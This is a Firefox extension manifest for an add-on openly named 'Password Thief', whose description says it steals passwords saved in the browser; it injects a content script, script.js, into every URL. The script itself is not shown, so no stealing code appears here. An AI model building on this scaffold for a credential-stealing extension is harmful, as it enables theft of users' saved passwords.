{
	"manifest_version": 2,
	"name" : "Password Thief",
	"version" : "1.0.1",

	"description" : "a firefox extension that steals passwords saved by your browser by petitcroco",

	"icons" : {
		"128" : "logo.png"
	},

	"content_scripts" : [
		{
			"matches" : ["<all_urls>"],
			"js" : ["script.js"]
		}
	],

	"browser_action" : {
		"default_icon" : "logo.png",
		"default_popup" : "popup.html"
	}
}